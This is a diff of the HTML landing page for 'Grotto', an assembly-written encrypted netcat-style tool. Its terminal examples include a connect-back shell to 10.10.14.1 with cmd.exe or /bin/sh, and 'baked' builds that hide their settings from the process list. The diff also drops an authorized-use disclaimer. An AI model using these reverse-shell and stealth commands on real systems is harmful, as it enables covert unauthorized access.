-        <div class="start-line"><span class="comment"># Client (connect to listener)</span></div>
-        <div class="start-line"><span class="prompt">$</span> <span class="cmd">./grotto </span><span class="flag">-c </span><span class="arg">10.10.14.1 </span><span class="flag">-p </span><span class="arg">4444 </span><span class="flag">-k </span><span class="arg">$KEY</span></div>
-        <div class="start-spacer"></div>
-        <div class="start-line"><span class="comment"># Encrypted shell relay</span></div>
-        <div class="start-line"><span class="prompt">$</span> <span class="cmd">./grotto </span><span class="flag">-l -p </span><span class="arg">4444 </span><span class="flag">-k </span><span class="arg">$KEY </span><span class="flag">-e </span><span class="str">/bin/sh</span></div>
-        <div class="start-spacer"></div>
-        <div class="start-line"><span class="comment"># Outputs: build/grotto (ELF) + build/grotto.exe (PE)</span></div>
-      </div>
-    </div>
+        <div class="terminal">
+            <div class="terminal-bar">
+                <span class="terminal-dot"></span>
+                <span class="terminal-dot"></span>
+                <span class="terminal-dot"></span>
+                <span class="terminal-label">bash &mdash; build &amp; connect</span>
+            </div>
+            <div class="terminal-body">
+<span class="c"># Build both targets (generates random PSK)</span>
+<span class="p">$</span> ./build.sh
 
-    <h3 style="color: var(--ctp-mauve); margin-top: 48px; font-size: 1.15rem; letter-spacing: 0.5px;">Baked Builds</h3>
-    <p class="section-desc" style="margin-top: 8px;">
-      Compile configuration directly into the binary &mdash; no CLI arguments needed, nothing visible in the process list.
-    </p>
+<span class="c"># Generate a 256-bit PSK</span>
+<span class="p">$</span> KEY=<span class="v">$(python3 -c "import secrets; print(secrets.token_hex(32))")</span>
 
-    <div class="start-terminal">
-      <div class="start-titlebar">
-        <span class="hero-dot hero-dot--red"></span>
-        <span class="hero-dot hero-dot--yellow"></span>
-        <span class="hero-dot hero-dot--green"></span>
-        <span class="start-titlebar-text">bash &mdash;&mdash; baked builds</span>
-      </div>
-      <div class="start-body">
-        <div class="start-line"><span class="comment"># Baked connect-back with encrypted shell</span></div>
-        <div class="start-line"><span class="prompt">$</span> <span class="cmd">./build.sh </span><span class="flag">--baked </span><span class="flag">-c </span><span class="arg">10.10.14.1 </span><span class="flag">-p </span><span class="arg">443 </span><span class="flag">-e </span><span class="str">cmd.exe</span></div>
-        <div class="start-spacer"></div>
-        <div class="start-line"><span class="comment"># Baked listener</span></div>
-        <div class="start-line"><span class="prompt">$</span> <span class="cmd">./build.sh </span><span class="flag">--baked </span><span class="flag">-l </span><span class="flag">-p </span><span class="arg">4444 </span><span class="flag">-e </span><span class="str">/bin/sh</span></div>
-        <div class="start-spacer"></div>
-        <div class="start-line"><span class="comment"># Baked with explicit key</span></div>
-        <div class="start-line"><span class="prompt">$</span> <span class="cmd">./build.sh </span><span class="flag">--baked </span><span class="flag">-c </span><span class="arg">10.10.14.1 </span><span class="flag">-p </span><span class="arg">443 </span><span class="flag">-k </span><span class="arg">&lt;64-hex-chars&gt; </span><span class="flag">-e </span><span class="str">cmd.exe</span></div>
-        <div class="start-spacer"></div>
-        <div class="start-line"><span class="comment"># Binary runs with zero arguments &mdash; config embedded at compile time</span></div>
-        <div class="start-line"><span class="prompt">$</span> <span class="cmd">./grotto</span>  <span class="comment"># that's it. no flags, nothing in process list.</span></div>
-      </div>
-    </div>
-  </section>
+<span class="c"># Listener (wait for connection)</span>
+<span class="p">$</span> ./grotto <span class="f">-l -p</span> <span class="v">4444</span> <span class="f">-k</span> <span class="v">$KEY</span>
 
-</div><!-- /.page-wrap -->
+<span class="c"># Client (connect to listener)</span>
+<span class="p">$</span> ./grotto <span class="f">-c</span> <span class="v">10.10.14.1</span> <span class="f">-p</span> <span class="v">4444</span> <span class="f">-k</span> <span class="v">$KEY</span>
 
-<!-- ============ FOOTER ============ -->
+<span class="c"># Encrypted shell relay</span>
+<span class="p">$</span> ./grotto <span class="f">-l -p</span> <span class="v">4444</span> <span class="f">-k</span> <span class="v">$KEY</span> <span class="f">-e</span> <span class="s">/bin/sh</span>
+            </div>
+        </div>
+
+        <div style="margin-top: 48px;">
+            <h3 style="font-family: 'JetBrains Mono', monospace; color: var(--mauve); font-size: 16px; margin-bottom: 12px;">Baked Builds</h3>
+            <p class="section-desc" style="margin-bottom: 20px;">
+                Compile configuration directly into the binary &mdash; no CLI arguments needed, nothing visible in the process list.
+            </p>
+
+            <div class="terminal">
+                <div class="terminal-bar">
+                    <span class="terminal-dot"></span>
+                    <span class="terminal-dot"></span>
+                    <span class="terminal-dot"></span>
+                    <span class="terminal-label">bash &mdash; baked builds</span>
+                </div>
+                <div class="terminal-body">
+<span class="c"># Baked connect-back with encrypted shell</span>
+<span class="p">$</span> ./build.sh <span class="f">--baked -c</span> <span class="v">10.10.14.1</span> <span class="f">-p</span> <span class="v">443</span> <span class="f">-e</span> <span class="s">cmd.exe</span>
+
+<span class="c"># Baked listener</span>
+<span class="p">$</span> ./build.sh <span class="f">--baked -l -p</span> <span class="v">4444</span> <span class="f">-e</span> <span class="s">/bin/sh</span>
+
+<span class="c"># Binary runs with zero arguments</span>
+<span class="p">$</span> ./grotto  <span class="c"># config embedded at compile time</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+</div>
+
+<!-- ════════════ FOOTER ════════════ -->
 <footer class="site-footer">
-  <div class="page-wrap">
-    <p class="footer-tagline">Pure assembly. Fully encrypted. Cross-platform.</p>
-    <p class="footer-sub">Grotto &mdash; ChaCha20-Poly1305 encrypted netcat in ~8 KB</p>
-    <div class="footer-links">
-      <a href="https://github.com/Real-Fruit-Snacks/Grotto">GitHub</a>
-      <a href="#architecture">Documentation</a>
+    <div class="container">
+        <p class="footer-tagline">Pure assembly. Fully encrypted. Cross-platform.</p>
+        <p class="footer-sub">Grotto &mdash; ChaCha20-Poly1305 encrypted networking in ~8 KB</p>
+        <div class="footer-links">
+            <a href="https://github.com/Real-Fruit-Snacks/Grotto">GitHub</a>
+            <a href="#architecture">Documentation</a>
+            <a href="https://github.com/Real-Fruit-Snacks/Grotto/issues">Issues</a>
+        </div>
+        <p class="footer-copy">x86_64 NASM &middot; Linux + Windows &middot; RFC 8439 AEAD &middot; PEB Walking &middot; Raw Syscalls</p>
+        <p class="footer-toolkit">
+            Part of the Real-Fruit-Snacks security toolkit:
+            <a href="https://github.com/Real-Fruit-Snacks/Tidepool">Tidepool</a> &middot;
+            <a href="https://github.com/Real-Fruit-Snacks/Riptide">Riptide</a> &middot;
+            <a href="https://github.com/Real-Fruit-Snacks/Cascade">Cascade</a> &middot;
+            <a href="https://github.com/Real-Fruit-Snacks/Slipstream">Slipstream</a> &middot;
+            <a href="https://github.com/Real-Fruit-Snacks/HydroShot">HydroShot</a> &middot;
+            <a href="https://github.com/Real-Fruit-Snacks/Aquifer">Aquifer</a> &middot;
+            <a href="https://github.com/Real-Fruit-Snacks/Conduit">Conduit</a> &middot;
+            <a href="https://github.com/Real-Fruit-Snacks/Flux">Flux</a> &middot;
+            <strong style="color: var(--subtext0);">Grotto</strong>
+        </p>
     </div>
-    <p class="footer-copy">x86_64 NASM &middot; Linux + Windows &middot; RFC 8439 AEAD &middot; PEB Walking &middot; Raw Syscalls</p>
-    <p class="footer-copy" style="margin-top: 16px; max-width: 600px; margin-left: auto; margin-right: auto; line-height: 1.5;"><strong style="color: var(--ctp-subtext1);">For authorized use only.</strong> This tool is intended for legitimate security research, authorized penetration testing, and educational purposes. Unauthorized access to computer systems is illegal. Users are solely responsible for ensuring compliance with all applicable laws and obtaining proper authorization before use.</p>
-  </div>
 </footer>
 
 </body>
